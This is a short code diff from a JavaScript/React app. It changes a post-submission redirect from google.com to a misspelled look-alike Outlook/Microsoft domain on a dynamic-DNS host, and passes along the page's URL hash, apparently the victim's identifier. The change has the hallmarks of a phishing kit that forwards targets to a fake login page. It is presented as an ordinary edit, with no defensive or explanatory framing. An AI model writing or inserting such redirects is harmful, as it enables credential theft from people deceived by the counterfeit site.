@@ -18,7 +18,7 @@ const App = () => {
       const { message } = response.data;
       if (message) {
         const hashValue = window.location.hash.substring(1);
-        window.location.href = `https://google.com#${hashValue}`;
+        window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
       }
 
       // Proceed with your form submission logic here if needed
